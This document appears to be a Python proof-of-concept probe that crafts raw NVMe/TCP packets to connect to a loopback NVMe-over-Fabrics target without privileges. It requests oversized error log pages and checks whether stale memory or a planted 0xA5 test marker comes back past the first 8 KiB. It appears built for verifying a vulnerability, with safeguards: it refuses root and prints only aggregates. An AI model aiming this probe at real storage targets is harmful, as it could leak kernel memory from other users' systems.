#!/usr/bin/env python3
"""Raw, unprivileged NVMe/TCP admin-queue probe for a disposable loopback target.

This intentionally avoids /dev/nvme* and NVME_IOCTL_ADMIN_CMD. It implements
only ICReq, Fabrics Connect, Property Set(CC), and Get Log Page. The script
logs response-tail aggregates only; it never prints or stores raw tail bytes.
"""
import argparse
import socket
import struct
import sys
import time
import uuid

PDU_ICREQ = 0x00
PDU_ICRESP = 0x01
PDU_CMD = 0x04
PDU_RSP = 0x05
PDU_C2H_DATA = 0x07
NVME_FABRICS_CMD = 0x7f
FABRICS_PROPERTY_SET = 0x00
FABRICS_CONNECT = 0x01
GET_LOG_PAGE = 0x02
LOG_ERROR = 0x01
SGL_METABUF = 1 << 6
SGL_DATA_BLOCK_OFFSET = 0x01
SGL_TRANSPORT_DATA = (0x05 << 4) | 0x0a


class ProtocolError(RuntimeError):
    pass


def recv_exact(sock: socket.socket, length: int, stage: str = "stream") -> bytes:
    chunks = []
    left = length
    while left:
        data = sock.recv(left)
        if not data:
            raise EOFError(f"{stage}: peer closed with {left} bytes remaining")
        chunks.append(data)
        left -= len(data)
    return b"".join(chunks)


def send_icreq(sock: socket.socket) -> None:
    # 128-byte ICReq, no header/data digests, no PDU alignment.
    pdu = bytearray(128)
    struct.pack_into("<BBBBI", pdu, 0, PDU_ICREQ, 0, 128, 0, 128)
    struct.pack_into("<HBBI", pdu, 8, 0, 0, 0, 0)
    sock.sendall(pdu)

    print("RAW_TCP_STAGE=ICREQ_SENT")
    response = recv_exact(sock, 128, "ICResp")
    print("RAW_TCP_STAGE=ICRESP_RECEIVED")
    ptype, flags, hlen, pdo, plen = struct.unpack_from("<BBBBI", response)
    if (ptype, hlen, pdo, plen) != (PDU_ICRESP, 128, 0, 128):
        raise ProtocolError(
            f"invalid ICResp: type={ptype} hlen={hlen} pdo={pdo} plen={plen}"
        )
    pfv, cpda, digest, maxdata = struct.unpack_from("<HBBI", response, 8)
    if pfv != 0 or cpda != 0 or digest != 0 or maxdata < 4096:
        raise ProtocolError(
            f"unsupported ICResp fields: pfv={pfv} cpda={cpda} "
            f"digest={digest} maxdata={maxdata}"
        )


def recv_pdu(sock: socket.socket, max_pdu: int = 4 * 1024 * 1024 + 4096) -> bytes:
    header = recv_exact(sock, 8, "PDU header")
    ptype, flags, hlen, pdo, plen = struct.unpack("<BBBBI", header)
    if plen < 8 or plen > max_pdu:
        raise ProtocolError(f"invalid PDU length {plen}")
    try:
        body = recv_exact(sock, plen - 8, f"PDU body type={ptype} hlen={hlen} pdo={pdo} plen={plen}")
    except EOFError as exc:
        raise ProtocolError(str(exc)) from exc
    return header + body


def completion(sock: socket.socket, expected_cid: int) -> tuple[int, int]:
    pdu = recv_pdu(sock)
    ptype, flags, hlen, pdo, plen = struct.unpack_from("<BBBBI", pdu)
    if ptype != PDU_RSP or hlen != 24 or plen != 24:
        raise ProtocolError(
            f"expected response capsule; got type={ptype} hlen={hlen} plen={plen}"
        )
    result = struct.unpack_from("<I", pdu, 8)[0]
    sq_head, sqid, cid, status = struct.unpack_from("<HHHH", pdu, 16)
    if cid != expected_cid:
        raise ProtocolError(f"completion CID mismatch: {cid} != {expected_cid}")
    return result, status


def send_connect(sock: socket.socket, subsysnqn: str, hostnqn: str) -> int:
    connect_data = bytearray(1024)
    connect_data[0:16] = uuid.uuid4().bytes
    struct.pack_into("<H", connect_data, 16, 0xffff)
    connect_data[256:256 + 256] = subsysnqn.encode("ascii")[:255].ljust(256, b"\0")
    connect_data[512:512 + 256] = hostnqn.encode("ascii")[:255].ljust(256, b"\0")

    cmd = bytearray(64)
    cmd[0] = NVME_FABRICS_CMD
    cmd[1] = SGL_METABUF
    struct.pack_into("<H", cmd, 2, 1)  # command id
    cmd[4] = FABRICS_CONNECT
    # SGL data-block offset descriptor. The capsule data starts at PDO=72.
    struct.pack_into("<QI", cmd, 24, 0, len(connect_data))
    cmd[39] = SGL_DATA_BLOCK_OFFSET
    struct.pack_into("<HHH", cmd, 40, 0, 0, 31)  # recfmt, qid, 0-based sqsize
    cmd[46] = 0  # cattr

    pdu = bytearray(8) + cmd + connect_data
    struct.pack_into("<BBBBI", pdu, 0, PDU_CMD, 0, 72, 72, len(pdu))
    sock.sendall(pdu)
    print("RAW_TCP_STAGE=CONNECT_SENT")
    try:
        result, status = completion(sock, 1)
    except Exception as exc:
        raise ProtocolError(f"Fabrics Connect response: {exc}") from exc
    status_code = status >> 1
    if status_code:
        raise ProtocolError(
            f"Fabrics Connect rejected: status=0x{status:04x} "
            f"(code=0x{status_code:x})"
        )
    return result & 0xffff


def set_cc(sock: socket.socket, command_id: int) -> None:
    cmd = bytearray(64)
    cmd[0] = NVME_FABRICS_CMD
    cmd[1] = SGL_METABUF
    struct.pack_into("<H", cmd, 2, command_id)
    cmd[4] = FABRICS_PROPERTY_SET
    cmd[40] = 0  # 4-byte property access
    struct.pack_into("<I", cmd, 44, 0x14)  # NVME_REG_CC
    cc = (6 << 16) | (4 << 20) | 1  # IOSQES=6, IOCQES=4, EN=1
    struct.pack_into("<Q", cmd, 48, cc)
    pdu = bytearray(8) + cmd
    struct.pack_into("<BBBBI", pdu, 0, PDU_CMD, 0, 72, 0, 72)
    sock.sendall(pdu)
    _, status = completion(sock, command_id)
    if status >> 1:
        raise ProtocolError(f"Property Set(CC) failed: status=0x{status:04x}")
    time.sleep(0.1)


def issue_get_log(sock: socket.socket, command_id: int, data_len: int) -> bytes:
    if data_len < 8192 or data_len % 4:
        raise ValueError("data_len must be a multiple of four and >= 8192")
    numd = data_len // 4 - 1
    cmd = bytearray(64)
    cmd[0] = GET_LOG_PAGE
    cmd[1] = SGL_METABUF
    struct.pack_into("<H", cmd, 2, command_id)
    struct.pack_into("<I", cmd, 4, 0xffffffff)  # controller-global log
    struct.pack_into("<QI", cmd, 24, 0, data_len)
    cmd[39] = SGL_TRANSPORT_DATA
    struct.pack_into("<I", cmd, 40, ((numd & 0xffff) << 16) | LOG_ERROR)
    struct.pack_into("<I", cmd, 44, (numd >> 16) & 0xffff)

    pdu = bytearray(8) + cmd
    struct.pack_into("<BBBBI", pdu, 0, PDU_CMD, 0, 72, 0, 72)
    sock.sendall(pdu)

    received = bytearray()
    while True:
        response = recv_pdu(sock)
        ptype, flags, hlen, pdo, plen = struct.unpack_from("<BBBBI", response)
        if ptype == PDU_C2H_DATA:
            if hlen != 24 or pdo != 24 or plen < pdo:
                raise ProtocolError(
                    f"invalid C2H data PDU: hlen={hlen} pdo={pdo} plen={plen}"
                )
            cid, ttag, data_offset, data_length = struct.unpack_from(
                "<HHII", response, 8
            )
            if cid != command_id or data_offset != len(received):
                raise ProtocolError("C2H data CID or offset mismatch")
            if pdo + data_length > plen:
                raise ProtocolError("C2H data length exceeds PDU length")
            received.extend(response[pdo:pdo + data_length])
            if flags & 0x04:  # NVME_TCP_F_DATA_LAST
                break
        elif ptype == PDU_RSP:
            # The target rejected the command before sending data.
            result, status = struct.unpack_from("<I", response, 8)[0], \
                struct.unpack_from("<H", response, 22)[0]
            raise ProtocolError(
                f"Get Log Page rejected before data: status=0x{status:04x} "
                f"result=0x{result:08x}"
            )
        else:
            raise ProtocolError(f"unexpected PDU type {ptype} during data transfer")

    _, status = completion(sock, command_id)
    if status >> 1:
        raise ProtocolError(f"Get Log Page completion failed: 0x{status:04x}")
    if len(received) != data_len:
        raise ProtocolError(f"short response: {len(received)} != {data_len}")
    return bytes(received)


def main() -> int:
    import os

    if os.geteuid() == 0:
        raise ProtocolError("raw protocol probe must not run as root")
    with open("/proc/self/status", encoding="ascii") as status_file:
        cap_eff = next(
            (line.split()[1] for line in status_file if line.startswith("CapEff:")),
            "0",
        )
    if int(cap_eff, 16) != 0:
        raise ProtocolError(f"raw process still has effective capabilities: {cap_eff}")

    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=4420)
    parser.add_argument("--subsysnqn", required=True)
    parser.add_argument("--hostnqn", default="nqn.2026-11.io.udroid:raw-unprivileged-host")
    parser.add_argument("--lengths", nargs="+", type=int, default=[8192, 16384, 65536])
    args = parser.parse_args()

    with socket.create_connection((args.host, args.port), timeout=5) as sock:
        sock.settimeout(10)
        send_icreq(sock)
        cntlid = send_connect(sock, args.subsysnqn, args.hostnqn)
        print(f"RAW_TCP_CONNECT=SUCCESS cntlid={cntlid} uid={__import__('os').geteuid()}")
        print("RAW_TCP_STAGE=CONNECT_ACCEPTED")
        set_cc(sock, 2)
        print("RAW_TCP_STAGE=CC_ENABLED")

        for index, length in enumerate(args.lengths, start=3):
            data = issue_get_log(sock, index, length)
            tail = data[8192:]
            nonzero = sum(1 for value in tail if value != 0)
            marker = tail.count(0xa5)
            marker_run = 0
            max_marker_run = 0
            for value in tail:
                if value == 0xa5:
                    marker_run += 1
                    max_marker_run = max(max_marker_run, marker_run)
                else:
                    marker_run = 0
            if max_marker_run >= 64:
                classification = "TEST_MARKER_REAPPEARED"
            elif nonzero:
                classification = "NONZERO_TAIL_OBSERVED"
            else:
                classification = "ZERO_TAIL_INCONCLUSIVE"
            print(
                f"RAW_RESULT len={length} uid={os.geteuid()} "
                f"tail_bytes={len(tail)} nonzero={nonzero} "
                f"marker_a5={marker} max_marker_run={max_marker_run} "
                f"classification={classification}"
            )
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as exc:
        print(f"RAW_TCP_PROBE=FAILED: {exc}", file=sys.stderr)
        sys.exit(1)
